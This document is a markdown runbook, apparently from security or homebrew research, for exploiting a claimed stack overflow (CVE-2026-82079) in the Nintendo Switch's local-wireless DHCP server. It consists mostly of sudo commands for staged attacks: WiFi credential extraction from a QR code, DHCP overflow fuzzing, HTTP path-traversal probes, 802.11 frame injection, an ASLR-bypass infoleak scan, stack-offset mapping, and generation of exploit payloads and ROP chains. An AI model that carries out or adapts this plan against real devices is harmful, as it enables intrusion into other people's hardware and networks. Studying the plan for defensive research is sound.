# CVE-2026-82079 Attack Runbook

Prioritized execution plan for when the Switch is available.
All tools are pre-built and ready.

## Prerequisites

- Switch powered on, Album → "Send to Smartphone" mode
- PC WiFi connected to `switch_F3DCDB0100S` AP
- Get IP 192.168.0.2 (DHCP from Switch)
- Capture QR code screenshot before connecting (for PSK extraction)

## Phase 1: QR Code + Credentials (5 min)

```bash
# 1. Photograph/screenshot the QR code displayed on Switch
# 2. Extract WiFi credentials
python3 -I ldn_research/scripts/recon/qr_credential_extractor.py qr_screenshot.png
# If PSK is static across sessions → enables direct association fuzzing
```

## Phase 2: lp2p DHCP Server Overflow (THE CVE TARGET) (15 min)

**CVE-2026-82079 is in the lp2p DHCP server**, not the HTTP server.
The DHCP server copies frame data to stack without size validation.
This is the #1 priority probe.

```bash
cd ldn_research/scripts/dhcp

# 2a. TARGETED: lp2p DHCP overflow probe (requires sudo)
sudo python3 -I lp2p_dhcp_overflow.py --iface wlp5s0 --phase boundary

# 2b. Per-option: which DHCP option type triggers the overflow?
sudo python3 -I lp2p_dhcp_overflow.py --iface wlp5s0 --phase per-option

# 2c. Combined: multi-option payloads to map stack layout
sudo python3 -I lp2p_dhcp_overflow.py --iface wlp5s0 --phase combined

# 2d. General DHCP probing (pool exhaustion, oversized options)
sudo python3 -I dhcp_probe.py --iface wlp5s0
```

If ANY crash is detected → that's the overflow boundary. Record exact size.
5-second DHCP lease = rapid testing cycle.

## Phase 3: HTTP + Path Traversal Recon (10 min)

The HTTP server bugs are NOT CVE-2026-82079 but still worth probing:

```bash
# Full HTTP server characterization (13 test modules)
python3 -I ../http/http_deep_recon.py
# Path traversal and directory listing probes
python3 -I ../http/http_path_traversal.py
# HTTP overflow probing (URI, headers, body sizes)
python3 -I ../http/http_overflow_probe.py --test all
```

## Phase 4: LDN Protocol Fuzzing (10 min)

Test hidden service ports and LDN protocol messages:

```bash
# 4a. Port scan + UDP probe + LDN protocol messages
python3 -I ../wifi/ldn_authenticated_fuzzer.py --test tcp_scan
python3 -I ../wifi/ldn_authenticated_fuzzer.py --test udp_scan
python3 -I ../wifi/ldn_authenticated_fuzzer.py --test udp_fuzz

# 4b. HTTP LDN-specific paths (POST, path traversal, hidden endpoints)
python3 -I ../wifi/ldn_authenticated_fuzzer.py --test http_fuzz
```

## Phase 5: WiFi Frame Injection (20 min, requires root)

Target the WiFi driver (Broadcom) and LDN frame handler:

```bash
# 5a. Management frame fuzzing (probe requests, association)
sudo python3 -I ../wifi/wifi_frame_inject.py --iface wlp5s0 --tests probe
sudo python3 -I ../wifi/wifi_frame_inject.py --iface wlp5s0 --tests assoc

# 5b. LDN action frame fuzzing (Nintendo vendor OUI)
sudo python3 -I ../wifi/ldn_action_frame_fuzzer.py --iface wlp5s0 --tests action

# 5c. Broadcom-specific action frames
sudo python3 -I ../wifi/ldn_action_frame_fuzzer.py --iface wlp5s0 --tests broadcom

# 5d. Data frame injection
sudo python3 -I ../wifi/ldn_action_frame_fuzzer.py --iface wlp5s0 --tests data

# 5e. Full LDN protocol fuzzer (69 tests: advert/auth/disconnect/malformed)
sudo python3 -I ../wifi/ldn_frame_fuzzer.py --iface wlp5s0 --target EC:C4:0D:F3:DC:DB
```

## Phase 6: ASLR Bypass — Infoleak Scan (5 min, requires root)

Scan for pointer leaks in AdvertiseData (need LDN session active):

```bash
# 6a. Scan existing pcap captures
python3 -I ../recon/ldn_infoleak_scanner.py --pcap ../../evidence/ldn_monitor*.pcap

# 6b. Live beacon scan (while Switch AP is active)
sudo python3 -I ../recon/ldn_infoleak_scanner.py --iface wlp5s0 --beacon-scan --duration 30

# 6c. Full monitor scan (while Switch is in multiplayer/LDN session)
sudo python3 -I ../recon/ldn_infoleak_scanner.py --iface wlp5s0 --monitor --duration 60
```

If pointer candidates found → record value, calculate ASLR base.
Erista has NO PAC, NO stack canaries → only ASLR + NX to bypass.

## Phase 7: Stack Layout Mapping (after crash boundary found)

```bash
# Map exact return address offset using De Bruijn pattern
sudo python3 -I ../dhcp/dhcp_stack_mapper.py --iface wlp5s0 --boundary <BOUNDARY> --map
```

## Phase 8: Exploit Generation (offline)

```bash
# Generate exploit payload
python3 -I ../dhcp/dhcp_stack_mapper.py --generate \
    --boundary <BOUNDARY> --x30-offset <OFFSET> \
    --target <GADGET_ADDR> --base <ASLR_BASE>

# Generate ROP chain template
python3 -I ../dhcp/dhcp_stack_mapper.py --rop-template \
    --boundary <BOUNDARY> --x30-offset <OFFSET> --base <ASLR_BASE>

# Find offset for a leaked register value
python3 -I ../dhcp/dhcp_stack_mapper.py --find-offset <HEX_VALUE> --boundary <BOUNDARY>
```

## Key Findings to Date

| Finding | Status | Implication |
|---------|--------|-------------|
| Double Content-Type on OOB Range | Confirmed | Custom HTTP parser, staged response building |
| Range on 404 body | Confirmed | Shared output buffer for all responses |
| ~~403 on phone~~ | **DEBUNKED** | Was Xfinity router, not Switch. No access control. |
| SSID-BSSID correlation | Confirmed | F3DCDB=MAC tail, 01=model, 00=pad, S=Switch |
| No auth/session tokens | Confirmed | Any AP client can access everything |
| Nintendo vendor IE | Confirmed | OUI 00:22:aa type 0x10, data: 01 01 |
| Broadcom WiFi chip | Confirmed | OUI 00:10:18 in beacons |
| Connection: close always | Confirmed | One request per TCP connection |

## Tools Inventory

| File | Purpose | Requires Switch |
|------|---------|-----------------|
| `scripts/dhcp/lp2p_dhcp_overflow.py` | **CVE-2026-82079 DHCP overflow probe (PRIORITY 1)** | **Yes + root** |
| `scripts/dhcp/dhcp_probe.py` | General DHCP server probing (pool, options, malformed) | Yes + root |
| `scripts/wifi/ldn_frame_fuzzer.py` | LDN protocol-aware fuzzer (69 tests, pcap export) | Yes + root |
| `scripts/wifi/ldn_action_frame_fuzzer.py` | Nintendo/Broadcom action frame fuzzing | Yes + root |
| `scripts/wifi/ldn_authenticated_fuzzer.py` | Port scan + UDP/HTTP LDN protocol fuzzing | Yes |
| `scripts/wifi/wifi_frame_inject.py` | 802.11 management frame injection | Yes + root |
| `scripts/http/http_deep_recon.py` | 13-module HTTP server characterization | Yes |
| `scripts/http/http_overflow_probe.py` | Binary search for HTTP buffer overflow | Yes |
| `scripts/http/http_path_traversal.py` | Path traversal and directory listing probes | Yes |
| `scripts/recon/ldn_pcap_parser.py` | Parse LDN frames from pcap (JSON/text output) | No (offline) |
| `scripts/recon/ldn_infoleak_scanner.py` | ASLR bypass: scan AdvertiseData for pointer leaks | Yes + root |
| `scripts/dhcp/dhcp_stack_mapper.py` | Stack layout mapping + exploit payload builder | Yes + root / offline |
| `scripts/recon/qr_credential_extractor.py` | Extract WiFi PSK from QR screenshot | No (offline) |
| `docs/cve_2026_82079_analysis.md` | Full CVE technical analysis | No (complete) |
| `docs/firmware_acquisition.md` | Firmware extraction pipeline + RE tool guide | No (complete) |
| `docs/http_server_analysis.md` | HTTP server analysis (corrected) | No (complete) |
| `docs/pcap_analysis.md` | Deep analysis of all pcap captures | No (complete) |
